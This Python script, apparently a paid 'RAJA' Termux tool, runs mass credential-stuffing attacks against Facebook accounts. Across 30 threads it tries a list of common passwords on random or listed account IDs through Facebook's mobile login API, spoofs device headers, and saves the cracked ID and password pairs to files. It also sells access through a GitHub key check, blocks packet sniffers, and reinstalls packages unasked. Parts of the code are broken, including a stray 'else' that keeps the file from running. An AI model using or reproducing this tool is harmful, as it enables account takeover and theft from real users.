import os
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()


# Initial setup and promotion
os.system('clear')
print(' \x1b[38;5;46mRAJA SERVER LOADING....')


os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
print('loading Modules ...\n')
os.system('clear')
os.system('xdg-open https://youtu.be/Rx4eNsxjCbE?si=PEa1vc3uShrxG723')
os.system('xdg-open https://youtu.be/Rx4eNsxjCbE?si=PEa1vc3uShrxG723')

# --- RAJA NEON COLOR THEME ---
R = "\033[0m"
B = "\033[1m"

PURPLE = "\033[38;5;201m"
PINK   = "\033[38;5;213m"
CYAN   = "\033[38;5;51m"
BLUE   = "\033[38;5;45m"
GREEN  = "\033[38;5;46m"
GOLD   = "\033[38;5;220m"
WHITE  = "\033[38;5;255m"
RED    = "\033[38;5;196m"
GRAY   = "\033[38;5;245m"


# --- GITHUB APPROVAL SYSTEM ---
def raja_approval():
    os.system("clear")

    uuid_raw = str(os.getlogin()) + str(os.getuid())
    key = hashlib.md5(uuid_raw.encode()).hexdigest().upper()[:12]

    github_link = "https://github.com/wa540610/5/blob/main/aprovel-73"

    print(f"""
{PURPLE}╔════════════════════════════════════════════════╗
{PURPLE}║ {CYAN}              𓆩 R.A.J.A 𓆪                 {PURPLE}     ║
{PURPLE}║ {PINK}             APPROVAL SYSTEM                {PURPLE}   ║
{PURPLE}╠════════════════════════════════════════════════╣
{PURPLE}║ {GOLD}              ⚡ PREMIUM ACCESS ⚡            {PURPLE} ║
{PURPLE}╚════════════════════════════════════════════════╝
{R}""")

    print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")

    print(
        f"{WHITE}{B} YOUR KEY {GRAY}➜ "
        f"{PINK}{B}RAJA-{key}{R}"
    )

    print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")

    print(f"{GOLD}{B}              💎 TOOL PRICES{R}")
    print(f"{PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")

    print(f"{CYAN}[01] {WHITE}7 Dollars   {PURPLE}➜ {GREEN}7 Days{R}")
    print(f"{BLUE}[02] {WHITE}14 Dollars  {PURPLE}➜ {GREEN}15 Days{R}")
    print(f"{PINK}[03] {WHITE}28 Dollars  {PURPLE}➜ {GREEN}30 Days{R}")

    print(f"{PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")

    print(
        f"{CYAN} ⚡ STATUS {WHITE}➜ "
        f"{GOLD}Checking Approval...{R}"
    )

    try:
        response = requests.get(
            github_link,
            timeout=10
        ).text

        if f"RAJA-{key}" in response:

            print(f"""
{GREEN}╔════════════════════════════════════════════════╗
{GREEN}║ {WHITE}             ✓ ACCESS GRANTED               {GREEN}   ║
{GREEN}║ {CYAN}          Welcome To RAJA TOOL ⚡            {GREEN}  ║
{GREEN}╚════════════════════════════════════════════════╝
{R}""")

            time.sleep(2)

        else:

            print(f"""
{RED}╔════════════════════════════════════════════════╗
{RED}║ {WHITE}             ✗ ACCESS DENIED                {RED}   ║
{RED}║ {GOLD}       Key Is Not Approved Yet              {RED}   ║
{RED}╚════════════════════════════════════════════════╝
{R}""")

            os.system(
                f'xdg-open "https://wa.me/+923229120975?'
                f'text=THIS IS MY KEY 🗝️ SIR👉{key}"'
            )

            sys.exit()

    except requests.RequestException:
        print(
            f"\n{RED}[!] {WHITE} Check Internet 🛜 connection.{R}"
        )
        sys.exit()


# --- START APPROVAL ---
raja_approval()
# --- Anti-tampering and Security Checks ---
# The script checks if the source code of the 'requests' library has been modified
# or if packet sniffing tools are being used.
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'

import os
import random
import time
from concurrent.futures import ThreadPoolExecutor as tred

# ==================== COLOR COMBINATIONS ==================== #
# Modern Neon Theme
C = '\033[1;36m'  # Bright Cyan
G = '\033[1;32m'  # Neon Green
Y = '\033[1;33m'  # Warm Yellow
R = '\033[1;31m'  # Crimson Red
M = '\033[1;35m'  # Bright Magenta / Purple
W = '\033[1;37m'  # Pure White
RESET = '\033[0m' # Reset Color

rad = R  # Red shortcut for errors

import random

def windows():
    """
    Generates a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])


def window1():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])


# Set window title
sys.stdout.write('\x1b]2;𓆩【 R.A.J.A 👑 】𓆪 \x07')

def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')

    print("""
\033[1;36m╔══════════════════════════════════════════════════╗
\033[1;35m║              𓆩  R.A.J.A 👑  𓆪                 \033[1;36m   ║
╠══════════════════════════════════════════════════╣
\033[1;32m║  ██████╗  █████╗      ██╗ █████╗               \033[1;36m  ║
\033[1;32m║  ██╔══██╗██╔══██╗     ██║██╔══██╗              \033[1;36m  ║
\033[1;32m║  ██████╔╝███████║     ██║███████║              \033[1;36m  ║
\033[1;32m║  ██╔══██╗██╔══██║██   ██║██╔══██║              \033[1;36m  ║
\033[1;32m║  ██║  ██║██║  ██║╚█████╔╝██║  ██║              \033[1;36m  ║
\033[1;32m║  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝              \033[1;36m  ║
╠══════════════════════════════════════════════════╣
\033[1;33m║  👑 OWNER : \033[1;37mRAJA CLONER 420 YOUTUBER          \033[1;36m   ║
\033[1;35m║  ⚡ TOOLS : \033[1;37mOLD ID CLONING                    \033[1;36m   ║
\033[1;34m║  ✦ VERSION : \033[1;37m2.8.0 VIP                         \033[1;36m  ║
╚══════════════════════════════════════════════════╝
\033[0m""")


def creationyear(uid):
    """
    Estimates the Facebook account creation year based on the UID.
    """
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''

def clear():
    os.system('clear')


def linex():
    print(f"{C}━" * 42 + f"{RESET}")


def BNG_71_():
    """Main menu function."""
    ____banner____()
    print(f"  {M}[{W}A{M}]{C} ──── {G}OLD CLONE")
    linex()
    
    __Jihad__ = input(f"  {M}[{W}➔{M}]{C} CHOICE {W}: {Y}").strip()
    
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n  {rad}[!] Choose Valid Option...{RESET}")
        time.sleep(2)
        BNG_71_()


def old_clone():
    """Menu for selecting old account cloning type."""
    ____banner____()
    print(f"  {M}[{W}A{M}]{C} ──── {G}ALL SERIES")
    linex()
    print(f"  {M}[{W}B{M}]{C} ──── {G}100003/4 SERIES")
    linex()
    print(f"  {M}[{W}C{M}]{C} ──── {G}2009 SERIES")
    linex()
    print(f"  {M}[{W}D{M}]{C} ──── {G}CUSTOM ID LIST (ids.txt)")
    linex()
    
    _input = input(f"  {M}[{W}➔{M}]{C} CHOICE {W}: {Y}").strip()
    
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    elif _input in ('D', 'd', '04', '4'):
        old_Custom()
    else:
        print(f"\n  {rad}[!] Choose Valid Option...{RESET}")
        time.sleep(1.5)
        BNG_71_()


def old_One():
    """Cloning method for accounts from 2010-2014."""
    user = []
    ____banner____()
    print(f"  {M}[{W}➔{M}]{C} Old Code {W}:{G} 2010-2014")
    ask = input(f"  {M}[{W}➔{M}]{C} SELECT   {W}:{G} ")
    linex()
    
    ____banner____()
    print(f"  {M}[{W}#{M}]{C} EXAMPLE  {W}:{Y} 20000 / 30000 / 99999")
    limit = input(f"  {M}[{W}#{M}]{C} LIMIT    {W}:{G} ")
    linex()
    
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)

    print(f"  {M}[{W}A{M}]{C} ──── {G}METHOD 1")
    print(f"  {M}[{W}B{M}]{C} ──── {G}METHOD 2")
    linex()
    
    meth = input(f"  {M}[{W}➔{M}]{C} CHOICE {W}(A/B): {Y}").strip().upper()
    
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"  {M}[{W}✓{M}]{C} TOTAL IDs TO CRACK {W}: {G}{limit}{W}")
        print(f"  {M}[{W}!{M}]{Y} USE AIRPLANE MODE FOR BETTER RESULTS{RESET}")
        linex()
        
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"  {rad}[!] INVALID METHOD SELECTED{RESET}")
                break


def old_Tow():
    """Cloning method for accounts with specific prefixes."""
    user = []
    ____banner____()
    print(f"  {M}[{W}➔{M}]{C} OLD CODE {W}:{G} 2010-2014")
    ask = input(f"  {M}[{W}➔{M}]{C} SELECT   {W}:{G} ")
    linex()
    
    ____banner____()
    print(f"  {M}[{W}#{M}]{C} EXAMPLE  {W}:{Y} 20000 / 30000 / 99999")
    limit = input(f"  {M}[{W}#{M}]{C} LIMIT    {W}:{G} ")
    linex()
    
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix + suffix)

    print(f"  {M}[{W}A{M}]{C} ──── {G}METHOD A")
    print(f"  {M}[{W}B{M}]{C} ──── {G}METHOD B")
    linex()
    
    meth = input(f"  {M}[{W}➔{M}]{C} CHOICE {W}(A/B): {Y}").strip().upper()
    
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"  {M}[{W}✓{M}]{C} TOTAL IDs TO CRACK {W}: {G}{limit}{W}")
        print(f"  {M}[{W}!{M}]{Y} USE AIRPLANE MODE FOR BETTER RESULTS{RESET}")
        linex()
        
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"  {rad}[!] INVALID METHOD SELECTED{RESET}")
                break


def old_Tree():
    """Cloning method for accounts from 2009-2010."""
    user = []
    ____banner____()
    print(f"  {M}[{W}➔{M}]{C} OLD CODE {W}:{G} 2009-2010")
    ask = input(f"  {M}[{W}➔{M}]{C} SELECT   {W}:{G} ")
    linex()
    
    ____banner____()
    print(f"  {M}[{W}#{M}]{C} EXAMPLE  {W}:{Y} 20000 / 30000 / 99999")
    limit = input(f"  {M}[{W}#{M}]{C} LIMIT    {W}:{G} ")
    linex()
    
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        user.append(prefix + suffix)

    print(f"  {M}[{W}A{M}]{C} ──── {G}METHOD A")
    print(f"  {M}[{W}B{M}]{C} ──── {G}METHOD B")
    linex()
    
    meth = input(f"  {M}[{W}➔{M}]{C} CHOICE {W}(A/B): {Y}").strip().upper()
    
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"  {M}[{W}✓{M}]{C} TOTAL IDs TO CRACK {W}: {G}{limit}{W}")
        print(f"  {M}[{W}!{M}]{Y} USE AIRPLANE MODE FOR BETTER RESULTS{RESET}")
        linex()
        
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"  {rad}[!] INVALID METHOD SELECTED{RESET}")
                break
def old_Custom():
    """Crack IDs from a custom user-provided list file (ids.txt)."""
    user = []
    ____banner____()
    print(f"  {M}[{W}➔{M}]{C} CUSTOM ID LIST CRACKER")
    linex()

    file_path = input(f"  {M}[{W}#{M}]{C} FILE PATH {W}(Enter = ids.txt): {Y}").strip()
    if not file_path:
        file_path = 'ids.txt'

    if not os.path.exists(file_path):
        print(f"\n  {rad}[!] File Not Found: {file_path}{RESET}")
        print(f"  {G}[!] ids.txt script wali folder mein rakho, har line par 1 ID{RESET}")
        time.sleep(2)
        old_clone()
        return

    with open(file_path, 'r') as f:
        for line in f:
            uid = line.strip()
            if uid and uid.isdigit():
                user.append(uid)

    if not user:
        print(f"\n  {rad}[!] No Valid IDs Found In File{RESET}")
        time.sleep(2)
        old_clone()
        return

    print(f"  {M}[{W}✓{M}]{C} TOTAL IDS FOUND {W}: {G}{len(user)}{R}")
    print(f"  {M}[{W}A{M}]{C} ──── {G}METHOD 1")
    print(f"  {M}[{W}B{M}]{C} ──── {G}METHOD 2")
    linex()

    meth = input(f"  {M}[{W}➔{M}]{C} CHOICE {W}(A/B): {Y}").strip().upper()

    if meth not in ('A', 'B'):
        print(f"\n  {rad}[!] INVALID METHOD SELECTED{RESET}")
        time.sleep(1.5)
        old_clone()
        return

    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"  {M}[{W}✓{M}]{C} TOTAL IDs TO CRACK {W}: {G}{len(user)}{W}")
        print(f"  {M}[{W}!{M}]{Y} USE AIRPLANE MODE FOR BETTER RESULTS{RESET}")
        linex()

        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)
             else:
                print(f"  {rad}[!] INVALID METHOD SELECTED{RESET}")
                break


def login_1(uid):
    """
    Login attempt method 1.
    """
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;97m\x1b[38;5;51m\x1b[1;97m\x1b[38;5;51m[\x1b[1;95mRAJA-M1\x1b[38;5;51m]\x1b[1;97m\x1b[38;5;51m\x1b[1;97m\x1b[38;5;51m[\x1b[38;5;226m{loop}\x1b[38;5;51m]\x1b[1;97m\x1b[38;5;51m\x1b[1;97m\x1b[38;5;51m[\x1b[1;92mOK\x1b[38;5;51m]\x1b[1;97m\x1b[38;5;51m\x1b[1;97m\x1b[38;5;51m[\x1b[38;5;46m{len(oks)}\x1b[38;5;51m]")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789', '786786', 'pakistan123', 'Pakistan123', 'Pakistan1234', 'Pakistan12345', 'saeed20749', 'Pakistan', 'Lahore123', 'Lahore1234', 'lahore', 'iloveyou'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'PK',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;97m>\x1b[38;5;51m├Ч\x1b[1;97m<\x1b[38;5;51m(\x1b[1;95mRAJA\x1b[38;5;51m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;226m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;97m\x1b[38;5;51m\x1b[1;97m\x1b[38;5;51m(\x1b[1;95mRAJA-M1💸\x1b[38;5;51m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;226m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)


def login_2(uid):
    """
    Login attempt method 2.
    """
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    
    for pw in ('123456', '1234567', '12345678', '123456789', '786786', 'pakistan123', 'Pakistan123', 'Pakistan1234', 'Pakistan12345', 'Pakistan', 'Pakistan', 'Lahore123', 'Lahore1234', 'lahore', 'iloveyou'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception as e:
            pass
    loop += 1

if __name__ == '__main__':
    BNG_71_()
